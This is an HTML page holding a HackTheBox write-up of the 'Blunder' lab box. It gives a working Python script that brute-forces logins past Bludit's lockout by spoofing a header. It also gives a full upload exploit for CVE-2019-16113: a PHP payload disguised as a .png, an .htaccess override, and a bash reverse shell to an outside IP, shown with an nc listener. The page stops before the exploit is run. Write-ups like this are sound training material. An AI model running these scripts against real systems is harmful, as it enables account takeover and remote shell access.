<!DOCTYPE html>
<html lang=en>
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="Blunder just retired on Hackthebox, it’s an easy difficulty Linux box. This one got me a little frustrated at the beginning but in the end was quite fun and allowed me to play around with some usefu">
<meta property="og:type" content="article">
<meta property="og:title" content="HackTheBox - Blunder">
<meta property="og:url" content="https://hg8.sh/posts/blunder/index.html">
<meta property="og:site_name" content="hg8&#39;s Notes — My notes about infosec world. Pentest&#x2F;Bug Bounty&#x2F;CTF Writeups.">
<meta property="og:description" content="Blunder just retired on Hackthebox, it’s an easy difficulty Linux box. This one got me a little frustrated at the beginning but in the end was quite fun and allowed me to play around with some usefu">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/84426140-04a55b80-ac23-11ea-9013-d8e9d9f8c869.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/84426529-acbb2480-ac23-11ea-9b90-4a2b29952efa.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/84428097-2fdd7a00-ac26-11ea-9e64-2617fd15544f.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/85209918-1336f580-b33c-11ea-8343-972c8827eeb1.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/85209957-7163d880-b33c-11ea-9cf4-00eb906e8fc2.png">
<meta property="article:published_time" content="2020-10-16T22:00:00.000Z">
<meta property="article:modified_time" content="2022-08-04T08:37:52.826Z">
<meta property="article:author" content="hg8">
<meta property="article:tag" content="linux">
<meta property="article:tag" content="Blunder">
<meta property="article:tag" content="bludit cms">
<meta property="article:tag" content="CVE-2019-17240">
<meta property="article:tag" content="cewl">
<meta property="article:tag" content="upload restriction bypass">
<meta property="article:tag" content="htaccess">
<meta property="article:tag" content="CVE-2019-16113">
<meta property="article:tag" content="SHA1">
<meta property="article:tag" content="sudo">
<meta property="article:tag" content="CVE-2019-14287">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://user-images.githubusercontent.com/9076747/84426140-04a55b80-ac23-11ea-9013-d8e9d9f8c869.png">
    
    
        
          
              <link rel="shortcut icon" href="/images/favicon.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
          
        
    
     
    <title>HackTheBox - Blunder :: hg8&#39;s Notes — My notes about infosec world. Pentest/Bug Bounty/CTF Writeups.</title>
    
<link rel="stylesheet" href="/css/style.css">

    
    
<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="hg8's Notes — My notes about infosec world. Pentest/Bug Bounty/CTF Writeups." type="application/atom+xml">
</head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/posts/tabby/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/posts/cache/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
    </span>
    <br/>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#User-Flag"><span class="toc-number">1.</span> <span class="toc-text">User Flag</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Recon"><span class="toc-number">1.1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Brute-Force-Bludit-Admin-Account"><span class="toc-number">1.2.</span> <span class="toc-text">Brute Force Bludit Admin Account</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Remote-Code-Execution-via-Upload-Function"><span class="toc-number">1.3.</span> <span class="toc-text">Remote Code Execution via Upload Function</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pivot-www-data-gt-hugo"><span class="toc-number">1.4.</span> <span class="toc-text">Pivot www-data -&gt; hugo</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Root-FLag"><span class="toc-number">2.</span> <span class="toc-text">Root FLag</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Recon-1"><span class="toc-number">2.1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Sudo-Exploit"><span class="toc-number">2.2.</span> <span class="toc-text">Sudo Exploit</span></a></li></ol></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        <header id="header">
  <a href="/">
  
      <div id="logo" style="background-image: url(/images/logo.webp);"></div>
  
    <span class="logo__mark"></span>
    <span class="logo__text">./hg8.sh</span>
    <span class="logo__cursor"></span>
  </a>
  <div id="nav">
    <ul>
      <li class="icon">
        <a href="#"><i class="fas fa-bars fa-2x"></i></a>
      </li>
       
        <li><a href="/">Home</a></li>
       
        <li><a href="/about/">About</a></li>
       
        <li><a href="/archives/">Posts</a></li>
       
        <li><a href="/search/">Search</a></li>
      
    </ul>
  </div>
</header>

        
          <br>
          <br>
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        HackTheBox - Blunder
    </h1>



    <div class="meta"> 
      
    <div class="postdate">
      
        <time datetime="2020-10-16T22:00:00.000Z" itemprop="datePublished">17-10-2020</time>
        
      
    </div>


      — Written by 
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">hg8</span>
      </span>
      —
      10 min read
    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <img width="581" alt="blunder hackthebox" src="https://user-images.githubusercontent.com/9076747/84426140-04a55b80-ac23-11ea-9013-d8e9d9f8c869.png">

<p>Blunder just retired on Hackthebox, it’s an easy difficulty Linux box. This one got me a little frustrated at the beginning but in the end was quite fun and allowed me to play around with some useful tools and practice my Python coding skills. Good box if you like detective and guessing kind CTF ;)</p>
<p><strong>Tl;Dr:</strong> To get the user flag you first have to find a text file containing the website CMS admin username. Then you have to bruteforce the account password using a custom word list made from the website content. Once logged you can exploit a RCE vulnerability on the CMS to get a shell as <code>www-data</code>. There you find a file containing SHA-1 hashed password of <code>hugo</code> user. After cracking it you can use it to pivot to <code>hugo</code> user account and grab the flag.<br>To get the root flag you exploit a vulnerability in a specific configuration of <code>sudo</code> in order to escalate your privileges and read the flag. </p>
<p>Alright! Let’s get into the details now!</p>
<hr>
<p>First thing first, let’s add the box IP to the hosts file:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">&quot;10.10.10.191 blunder.htb&quot;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure>

<p>and let’s start!</p>
<h2 id="User-Flag"><a href="#User-Flag" class="headerlink" title="User Flag"></a>User Flag</h2><h3 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h3><p>Let’s start with the classic <code>nmap</code> scan to see which ports are open on the box:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nmap -sV -sT -sC blunder.htb</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-08 19:45 CEST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> blunder.htb (10.10.10.191)</span><br><span class="line">Host is up (0.26s latency).</span><br><span class="line">Not shown: 998 filtered ports</span><br><span class="line">PORT   STATE  SERVICE VERSION</span><br><span class="line">21/tcp closed ftp</span><br><span class="line">80/tcp open   http    Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">|_http-generator: Blunder</span><br><span class="line">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br><span class="line">|_http-title: Blunder | A blunder of interesting facts</span><br></pre></td></tr></table></figure>

<p>We have a classical web app running on port 80. Port SSH 22 is closed, that’s unusual but let’s continue.</p>
<p>Opening <a target="_blank" rel="noopener" href="http://blunder.htb/">http://blunder.htb</a> display a following page:</p>
<img width="1366" alt="blunder homepage" src="https://user-images.githubusercontent.com/9076747/84426529-acbb2480-ac23-11ea-9b90-4a2b29952efa.png">

<p>The website seems quite basic, no images and the about page is practically empty and do not give any additional informations.</p>
<p>Checking the response header informs us that the website is running <code>Bludit</code>:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ curl blunder.htb -I</span><br><span class="line">HTTP/1.0 200 OK</span><br><span class="line">Date: Thu, 11 Jun 2020 18:42:56 GMT</span><br><span class="line">Server: Apache/2.4.41 (Ubuntu)</span><br><span class="line">X-Powered-By: Bludit</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br></pre></td></tr></table></figure>

<p>Checking online we found out about it:</p>
<blockquote>
<p>Bludit is a web application to build your own website or blog in seconds, it’s completely free and open source. Bludit uses files in JSON format to store the content, you don’t need to install or configure a database. You only need a web server with PHP support.</p>
<p><a target="_blank" rel="noopener" href="https://www.bludit.com/">https://www.bludit.com</a></p>
</blockquote>
<p>Looking around Bludit Github page we stumble across an Remote Code Execution vulnerability: “<a target="_blank" rel="noopener" href="https://github.com/bludit/bludit/issues/1081">Bludit v3.9.2 Code Execution Vulnerability in Upload function</a>“.<br>Looks pretty neat! Unfortunately this is an authenticated exploit… Let’s continue to dig.</p>
<p>Searching a bit more about Bludit we stumble across one <a target="_blank" rel="noopener" href="https://rastating.github.io/bludit-brute-force-mitigation-bypass/">interesting article</a>:</p>
<blockquote>
<p><strong>Bludit Brute Force Mitigation Bypass</strong></p>
<p>Versions prior to and including 3.9.2 of the Bludit CMS are vulnerable to a bypass of the anti-brute force mechanism that is in place to block users that have attempted to incorrectly login 10 times or more. Within the bl-kernel/security.class.php file, there is a function named getUserIp which attempts to determine the true IP address of the end user by trusting the X-Forwarded-For and Client-IP HTTP headers.</p>
<p>[…]</p>
<p>The reasoning behind the checking of these headers is to determine the IP address of end users who are accessing the website behind a proxy, however, trusting these headers allows an attacker to easily spoof the source address. Additionally, no validation is carried out to ensure they are valid IP addresses, meaning that an attacker can use any arbitrary value and not risk being locked out.</p>
</blockquote>
<p>Those two articles gives a good insight of the path to follow. We should be able to brute-force the admin account and from there exploit the remote code execution vulnerability. </p>
<h3 id="Brute-Force-Bludit-Admin-Account"><a href="#Brute-Force-Bludit-Admin-Account" class="headerlink" title="Brute Force Bludit Admin Account"></a>Brute Force Bludit Admin Account</h3><p>So our first step is to bruteforce our way to admin panel. According to Bludit documentation it can be found at <code>/admin</code> endpoint:</p>
<p><img src="https://user-images.githubusercontent.com/9076747/84428097-2fdd7a00-ac26-11ea-9e64-2617fd15544f.png"></p>
<p>The original researcher who found the brute-force mitigation bypass provided a simple proof-of-concept. Let’s use it and adapt it to our needs:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">host = <span class="string">&#x27;http://10.10.10.191&#x27;</span></span><br><span class="line">login_url = host + <span class="string">&#x27;/admin&#x27;</span></span><br><span class="line">username = <span class="string">&#x27;admin&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;rockyou.txt&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    rockyou = f.readlines()</span><br><span class="line"></span><br><span class="line">wordlist = [x.strip() <span class="keyword">for</span> x <span class="keyword">in</span> rockyou]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> password <span class="keyword">in</span> wordlist:</span><br><span class="line">    session = requests.Session()</span><br><span class="line">    login_page = session.get(login_url)</span><br><span class="line">    csrf_token = re.search(<span class="string">&#x27;input.+?name=&quot;tokenCSRF&quot;.+?value=&quot;(.+?)&quot;&#x27;</span>, login_page.text).group(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[*] Trying: &#123;p&#125;&#x27;</span>.<span class="built_in">format</span>(p = password))</span><br><span class="line"></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;X-Forwarded-For&#x27;</span>: password,</span><br><span class="line">        <span class="string">&#x27;Referer&#x27;</span>: login_url</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;tokenCSRF&#x27;</span>: csrf_token,</span><br><span class="line">        <span class="string">&#x27;username&#x27;</span>: username,</span><br><span class="line">        <span class="string">&#x27;password&#x27;</span>: password,</span><br><span class="line">        <span class="string">&#x27;save&#x27;</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    login_result = session.post(login_url, headers = headers, data = data, allow_redirects = <span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;location&#x27;</span> <span class="keyword">in</span> login_result.headers:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;/admin/dashboard&#x27;</span> <span class="keyword">in</span> login_result.headers[<span class="string">&#x27;location&#x27;</span>]:</span><br><span class="line">            <span class="built_in">print</span>()</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;SUCCESS: Password found!&#x27;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Use &#123;u&#125;:&#123;p&#125; to login.&#x27;</span>.<span class="built_in">format</span>(u = username, p = password))</span><br><span class="line">            <span class="built_in">print</span>()</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>We run it and… bummer. No password found. </p>
<p>When this happen it’s always good to go back at the beginning to make sure we didn’t miss any information.</p>
<p>Usually we would run <code>gobuster</code> to see if we can come up with interesting files. Let’s give it a try now:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ gobuster dir -u <span class="string">&quot;http://blunder.htb/&quot;</span> -w ~/SecLists/Discovery/Web-Content/big.txt -x php,txt,sql</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.0.1</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span><br><span class="line">===============================================================</span><br><span class="line">/0 (Status: 200)</span><br><span class="line">/LICENSE (Status: 200)</span><br><span class="line">/about (Status: 200)</span><br><span class="line">/admin (Status: 301)</span><br><span class="line">/cgi-bin/ (Status: 301)</span><br><span class="line">/robots.txt (Status: 200)</span><br><span class="line">/server-status (Status: 403)</span><br><span class="line">/todo.txt (Status: 200)</span><br></pre></td></tr></table></figure>

<p>That <code>todo.txt</code> looks interesting:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ curl blunder.htb/todo.txt</span><br><span class="line">-Update the CMS</span><br><span class="line">-Turn off FTP - DONE</span><br><span class="line">-Remove old users - DONE</span><br><span class="line">-Inform fergus that the new blog needs images - PENDING</span><br></pre></td></tr></table></figure>

<p>“Inform fergus that the new blog needs images”. Looks like <code>fergus</code> is very probably the admin of the blog. Let’s update our script and use <code>fergus</code> as username this time. </p>
<p>…and no results again. What could it be now ? Maybe <code>fergus</code> password is not in the old <code>rockyou.txt</code> wordlist?  This is where a bit of guesswork happens.</p>
<p>The Blunder website is having quite a lot of vocabulary, especially the Stephen King article which have a lot of names that could make a password.<br>Let’s try to extract long strings from the website and test them as password.</p>
<p>To do so we could create a Python script using BeautifulSoup. But there is a tool that can do the job perfectly called <a target="_blank" rel="noopener" href="https://digi.ninja/projects/cewl.php"><code>cewl</code></a>. This tool will allows us to create a wordlist from the website content:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ruby cewl.rb <span class="string">&quot;http://10.10.10.191/&quot;</span> -m 7 -w blunder.txt</span><br><span class="line">[hg8@archbook ~]$ cat blunder.txt</span><br><span class="line">interesting</span><br><span class="line">Reading</span><br><span class="line">Fantasy</span><br><span class="line">National</span><br><span class="line">description</span><br><span class="line">Stephen</span><br><span class="line">nothing</span><br><span class="line">byEgotisticalSW</span><br><span class="line">American</span><br><span class="line">literature</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure>

<p>Now let’s edit our script to use our newly made wordlist and run it:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python bludit-bruteforce-bypass.py</span><br><span class="line">[*] Trying: Plugins</span><br><span class="line">[...]</span><br><span class="line">[*] Trying: fictional</span><br><span class="line">[*] Trying: character</span><br><span class="line">[*] Trying: RolandDeschain</span><br></pre></td></tr></table></figure>

<p>Bingo! We got the credentials as <code>fergus:RolandDeschain</code>.</p>
<h3 id="Remote-Code-Execution-via-Upload-Function"><a href="#Remote-Code-Execution-via-Upload-Function" class="headerlink" title="Remote Code Execution via Upload Function"></a>Remote Code Execution via Upload Function</h3><p>Once logged in as <code>fergus</code> we access the Bludit main dashboard:</p>
<p><img src="https://user-images.githubusercontent.com/9076747/85209918-1336f580-b33c-11ea-8343-972c8827eeb1.png" alt="bludit admin dashboard"></p>
<p>Now that we are authenticated we can take a deeper look at the vulnerability we found earlier: <a target="_blank" rel="noopener" href="https://github.com/bludit/bludit/issues/1081">Bludit v3.9.2 Code Execution Vulnerability via Upload function</a>.<br>We indeed have proper access to the upload function:</p>
<p><img src="https://user-images.githubusercontent.com/9076747/85209957-7163d880-b33c-11ea-9cf4-00eb906e8fc2.png" alt="bludit upload function"></p>
<p>We now have everything need in order to exploit the vulnerability. There is even a <a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/47699">Metasploit module</a> available for it.</p>
<p>Using Metasploit is cool and all but doesn’t help to understand what’s really going on and <em>how</em> the vulnerability is working. So I decided to write <a target="_blank" rel="noopener" href="https://github.com/hg8/CVE-2019-16113-PoC">my own script</a> in order to better understand the problem and train my Python skills.</p>
<p>I ended up with the following PoC:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment"># PoC by @hg8</span></span><br><span class="line"><span class="comment"># Credit: @christasa</span></span><br><span class="line"><span class="comment"># https://github.com/bludit/bludit/issues/1081</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://bludit-example.com&quot;</span></span><br><span class="line">user = <span class="string">&quot;admin&quot;</span></span><br><span class="line">password = <span class="string">&quot;admin&quot;</span></span><br><span class="line">cmd = <span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/10.10.10.10/8585 0&gt;&amp;1&#x27;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">admin_login</span>():</span></span><br><span class="line">    s = requests.Session()</span><br><span class="line">    login_page = s.get(<span class="string">f&quot;<span class="subst">&#123;url&#125;</span>/admin/&quot;</span>)</span><br><span class="line">    csrf_token = re.search(<span class="string">&#x27;&quot;tokenCSRF&quot;.+?value=&quot;(.+?)&quot;&#x27;</span>, login_page.text).group(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;username&quot;</span>: user,</span><br><span class="line">        <span class="string">&quot;password&quot;</span>: password,</span><br><span class="line">        <span class="string">&quot;tokenCSRF&quot;</span>: csrf_token</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    r = s.post(<span class="string">f&quot;<span class="subst">&#123;url&#125;</span>/admin/&quot;</span>, data, allow_redirects=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> r.status_code != <span class="number">301</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[!] Username or password incorrect.&quot;</span>)</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Loggin successful.&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_csrf</span>(<span class="params">s</span>):</span></span><br><span class="line">    r = s.get(<span class="string">f&quot;<span class="subst">&#123;url&#125;</span>/admin/&quot;</span>)</span><br><span class="line">    csrf_token = r.text.split(<span class="string">&#x27;var tokenCSRF = &quot;&#x27;</span>)[<span class="number">1</span>].split(<span class="string">&#x27;&quot;&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] Token CSRF: <span class="subst">&#123;csrf_token&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> csrf_token</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload_shell</span>(<span class="params">s, csrf_token</span>):</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;uuid&quot;</span>: <span class="string">&quot;../../tmp&quot;</span>,</span><br><span class="line">        <span class="string">&quot;tokenCSRF&quot;</span>: csrf_token</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    multipart = [(<span class="string">&#x27;images[]&#x27;</span>, (<span class="string">&quot;blut.png&quot;</span>, <span class="string">&quot;&lt;?php shell_exec(\&quot;rm .htaccess;rm blut.png;&quot;</span> + cmd + <span class="string">&quot;\&quot;);?&gt;&quot;</span>, <span class="string">&#x27;image/png&#x27;</span>))]</span><br><span class="line"></span><br><span class="line">    r = s.post(<span class="string">f&quot;<span class="subst">&#123;url&#125;</span>/admin/ajax/upload-images&quot;</span>, data, files=multipart)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> r.status_code != <span class="number">200</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[!] Error uploading Shell.&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[!] Make sure Bludit version &gt;= 3.9.2.&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Shell upload succesful.&quot;</span>)</span><br><span class="line"></span><br><span class="line">    multipart_htaccess = [(<span class="string">&#x27;images[]&#x27;</span>, (<span class="string">&#x27;.htaccess&#x27;</span>, <span class="string">&quot;RewriteEngine off\r\nAddType application/x-httpd-php .png&quot;</span>, <span class="string">&#x27;image/png&#x27;</span>))]</span><br><span class="line">    r = s.post(url + <span class="string">&quot;/admin/ajax/upload-images&quot;</span>, data, files=multipart_htaccess)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> r.status_code != <span class="number">200</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[!] Error uploading .htaccess.&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[!] Make sure Bludit version &gt;= 3.9.2.&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] .htaccess upload succesful.&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">execute_cmd</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = s.get(<span class="string">f&quot;<span class="subst">&#123;url&#125;</span>/bl-content/tmp/blut.png&quot;</span>, timeout=<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">except</span> requests.exceptions.ReadTimeout:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Command Execution Successful.&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    session = admin_login()</span><br><span class="line">    csrf_token = get_csrf(session)</span><br><span class="line">    upload_shell(session, csrf_token)</span><br><span class="line">    execute_cmd(session)</span><br></pre></td></tr></table></figure>

<p>Let’s use it to open a reverse shell.</p>
<p>First we open our <code>nc</code> listener:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br></pre></td></tr></table></figure>

<p>Then execute our Remote Code Execution exploit:</p>
